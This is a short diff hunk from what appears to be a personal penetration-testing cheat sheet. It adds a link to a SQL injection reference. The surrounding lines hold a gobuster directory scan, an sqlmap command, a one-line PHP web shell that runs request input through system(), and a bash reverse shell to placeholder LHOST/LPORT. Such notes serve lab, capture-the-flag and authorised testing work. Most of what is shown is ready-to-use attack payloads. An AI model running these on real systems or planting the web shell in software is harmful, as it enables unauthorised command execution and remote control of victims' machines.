@@ -27,6 +27,8 @@ gobuster dir -w WORDLIST -u URL -o OUTFILE
 
 sqlmap -r REQFILE --batch
 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
 <pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
 
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
